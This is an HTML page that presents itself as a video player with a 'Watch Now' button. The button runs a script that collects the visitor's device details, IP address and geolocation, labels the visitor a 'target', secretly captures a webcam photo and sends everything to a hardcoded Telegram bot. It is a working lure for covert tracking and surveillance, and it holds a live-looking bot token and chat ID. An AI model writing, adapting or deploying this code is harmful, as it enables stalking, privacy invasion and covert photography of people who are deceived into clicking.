<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Player</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; }
        .container { padding: 50px; }
        button { background-color: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading Video...</h2>
        <p>Please click the button to continue watching.</p>
        <button onclick="captureData()">Watch Now</button>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0'; // Telegram Bot Token ထည့်ပါ
        const chat_id = '5304050102'; // Telegram Chat ID ထည့်ပါ

        async function captureData() {
            // ၁။ Battery Info ရယူခြင်း
            let batteryInfo = "Unknown";
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `${(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
            } catch (e) {}

            // ၂။ Device & Browser Info
            const info = {
                Device: navigator.platform,
                Model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
                Browser: navigator.appName,
                RAM: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
                Battery: batteryInfo,
                Screen: `${window.screen.width}x${window.screen.height}`
            };

            // ၃။ IP & Location
            fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
                let message = `🚀 **Target Info Found!**\n\n`;
                message += `📱 Model: ${info.Model}\n`;
                message += `🔋 Battery: ${info.Battery}\n`;
                message += `🧠 RAM: ${info.RAM}\n`;
                message += `🖥 Screen: ${info.Screen}\n`;
                message += `🌐 IP: ${data.ip}\n`;
                message += `📍 City: ${data.city}, ${data.country_name}\n`;
                message += `📍 Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

                // Telegram ဆီ စာပို့ခြင်း
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
            });

            // ၄။ Camera Permission & Photo Capture
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chat_id);
                        fd.append('photo', blob, 'shot.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                }, 2000);
            } catch (e) {
                console.log("Camera access denied.");
            }
        }
    </script>
</body>
</html>
